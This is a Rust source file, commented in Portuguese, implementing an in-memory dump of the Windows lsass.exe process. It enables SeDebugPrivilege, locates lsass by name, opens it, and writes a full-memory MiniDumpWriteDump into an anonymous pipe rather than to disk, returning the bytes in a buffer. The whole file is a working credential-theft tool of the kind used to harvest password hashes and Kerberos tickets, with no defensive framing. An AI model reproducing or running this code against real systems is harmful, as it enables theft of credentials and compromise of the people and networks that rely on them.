use winapi::{
    shared::minwindef::{DWORD, FALSE},
    um::{
        handleapi::CloseHandle,
        processthreadsapi::{OpenProcessToken, GetCurrentProcess},
        securitybaseapi::AdjustTokenPrivileges,
        tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W},
        winnt::{
            HANDLE, LUID, SE_PRIVILEGE_ENABLED, SE_DEBUG_NAME, TOKEN_ADJUST_PRIVILEGES,
            TOKEN_PRIVILEGES, TOKEN_QUERY, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
            PROCESS_VM_WRITE, PROCESS_VM_OPERATION,
        },
        winbase::LookupPrivilegeValueW,
        errhandlingapi::GetLastError,
        fileapi::ReadFile,
        namedpipeapi::CreatePipe,
        winbase::HANDLE_FLAG_INHERIT,
        minwinbase::LPOVERLAPPED,
    },
};
use std::ptr;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::mem;

// Declaração externa do OpenProcess
#[link(name = "kernel32")]
extern "system" {
    fn OpenProcess(
        dwDesiredAccess: DWORD,
        bInheritHandle: i32,
        dwProcessId: DWORD,
    ) -> HANDLE;
}

// Declaração externa da função MiniDumpWriteDump
#[link(name = "DbgHelp")]
extern "system" {
    fn MiniDumpWriteDump(
        hProcess: HANDLE,
        ProcessId: DWORD,
        hFile: HANDLE,
        DumpType: u32,
        ExceptionParam: *mut (),
        UserStreamParam: *mut (),
        CallbackParam: *mut (),
    ) -> i32;
}

pub fn dump_to_memory() -> Result<Vec<u8>, String> {
    println!("[LSASS] Step 1: Starting dump_to_memory...");
    
    // Ativa privilégio SeDebugPrivilege
    println!("[LSASS] Step 2: Enabling debug privilege...");
    match enable_debug_privilege() {
        Ok(_) => println!("[LSASS] Step 3: Debug privilege enabled"),
        Err(e) => {
            println!("[LSASS] Step 3 FAILED: {}", e);
            return Err(e);
        }
    }
    
    // Encontra PID do lsass.exe
    println!("[LSASS] Step 4: Finding lsass.exe...");
    let pid = match find_process_id("lsass.exe") {
        Ok(p) => {
            println!("[LSASS] Step 5: Found lsass.exe with PID: {}", p);
            p
        }
        Err(e) => {
            println!("[LSASS] Step 5 FAILED: {}", e);
            return Err(e);
        }
    };
    
    // Abre processo com privilégios máximos
    println!("[LSASS] Step 6: Opening process...");
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | 
            PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            0,
            pid,
        )
    };
    
    if process_handle.is_null() {
        let err = unsafe { GetLastError() };
        println!("[LSASS] Step 6 FAILED: Failed to open process, error: {}", err);
        return Err(format!("Failed to open process, error: {}", err));
    }
    println!("[LSASS] Step 7: Process opened successfully");
    
    // Cria pipe anônimo pra capturar os dados
    println!("[LSASS] Step 8: Creating pipe...");
    let mut read_pipe: HANDLE = ptr::null_mut();
    let mut write_pipe: HANDLE = ptr::null_mut();
    let sa = ptr::null_mut();
    
    let success = unsafe {
        CreatePipe(&mut read_pipe, &mut write_pipe, sa, 0)
    };
    
    if success == 0 {
        println!("[LSASS] Step 8 FAILED: Failed to create pipe");
        unsafe { CloseHandle(process_handle); }
        return Err("Failed to create pipe".to_string());
    }
    println!("[LSASS] Step 9: Pipe created");
    
    // Garante que o pipe de leitura não é herdado
    println!("[LSASS] Step 10: Setting pipe handle info...");
    unsafe {
        winapi::um::handleapi::SetHandleInformation(read_pipe, HANDLE_FLAG_INHERIT, 0);
    }
    println!("[LSASS] Step 11: Pipe handle info set");
    
    // Executa o MiniDumpWriteDump escrevendo no pipe
    println!("[LSASS] Step 12: Calling MiniDumpWriteDump (this may take 10-30 seconds)...");
    let dump_type: u32 = 0x00000002; // MiniDumpWithFullMemory
    
    let result = unsafe {
        MiniDumpWriteDump(
            process_handle,
            pid,
            write_pipe,
            dump_type,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        )
    };
    
    unsafe { CloseHandle(write_pipe); }
    
    if result == 0 {
        let err = unsafe { GetLastError() };
        println!("[LSASS] Step 12 FAILED: MiniDumpWriteDump failed with error: {}", err);
        unsafe { CloseHandle(process_handle); CloseHandle(read_pipe); }
        return Err(format!("MiniDumpWriteDump failed, error: {}", err));
    }
    println!("[LSASS] Step 13: MiniDumpWriteDump succeeded!");
    
    // Lê os dados do pipe pro buffer
    println!("[LSASS] Step 14: Reading from pipe...");
    let mut buffer = [0u8; 65536];
    let mut bytes_read: DWORD = 0;
    let mut full_buffer = Vec::new();
    
    loop {
        let success = unsafe {
            ReadFile(
                read_pipe,
                buffer.as_mut_ptr() as _,
                buffer.len() as u32,
                &mut bytes_read,
                ptr::null_mut() as LPOVERLAPPED,
            )
        };
        
        if success == 0 || bytes_read == 0 {
            break;
        }
        
        full_buffer.extend_from_slice(&buffer[..bytes_read as usize]);
    }
    println!("[LSASS] Step 15: Read {} bytes from pipe", full_buffer.len());
    
    unsafe { 
        CloseHandle(read_pipe);
        CloseHandle(process_handle);
    }
    
    if full_buffer.is_empty() {
        println!("[LSASS] Step 16 FAILED: No data read from pipe");
        return Err("No data read from pipe".to_string());
    }
    
    println!("[LSASS] Step 17: Dump successful! Size: {} bytes", full_buffer.len());
    Ok(full_buffer)
}

fn enable_debug_privilege() -> Result<(), String> {
    let mut token_handle: HANDLE = ptr::null_mut();
    
    let success = unsafe {
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        )
    };
    
    if success == 0 {
        return Err("Failed to open process token".to_string());
    }
    
    let mut luid: LUID = unsafe { mem::zeroed() };
    let privilege_name: Vec<u16> = OsStr::new(SE_DEBUG_NAME)
        .encode_wide()
        .chain(Some(0))
        .collect();
    
    let success = unsafe {
        LookupPrivilegeValueW(
            ptr::null(),
            privilege_name.as_ptr(),
            &mut luid,
        )
    };
    
    if success == 0 {
        unsafe { CloseHandle(token_handle); }
        return Err("Failed to lookup privilege".to_string());
    }
    
    let mut tp: TOKEN_PRIVILEGES = unsafe { mem::zeroed() };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    let success = unsafe {
        AdjustTokenPrivileges(
            token_handle,
            FALSE,
            &mut tp,
            mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            ptr::null_mut(),
            ptr::null_mut(),
        )
    };
    
    unsafe { CloseHandle(token_handle); }
    
    if success == 0 {
        return Err("Failed to adjust token privileges".to_string());
    }
    
    Ok(())
}

fn find_process_id(process_name: &str) -> Result<DWORD, String> {
    let snapshot = unsafe {
        CreateToolhelp32Snapshot(
            winapi::um::tlhelp32::TH32CS_SNAPPROCESS,
            0,
        )
    };
    
    if snapshot as isize == -1isize {
        return Err("Failed to create snapshot".to_string());
    }
    
    let mut entry: PROCESSENTRY32W = unsafe { mem::zeroed() };
    entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
    
    let success = unsafe { Process32FirstW(snapshot, &mut entry) };
    
    if success == 0 {
        unsafe { CloseHandle(snapshot); }
        return Err("Failed to get first process".to_string());
    }
    
    let target_name: Vec<u16> = OsStr::new(process_name)
        .encode_wide()
        .chain(Some(0))
        .collect();
    
    loop {
        let current_name = &entry.szExeFile;
        
        if unsafe { 
            winapi::um::winbase::lstrcmpiW(current_name.as_ptr(), target_name.as_ptr()) == 0 
        } {
            let pid = entry.th32ProcessID;
            unsafe { CloseHandle(snapshot); }
            return Ok(pid);
        }
        
        let success = unsafe { Process32NextW(snapshot, &mut entry) };
        if success == 0 {
            break;
        }
    }
    
    unsafe { CloseHandle(snapshot); }
    Err(format!("Process {} not found", process_name))
}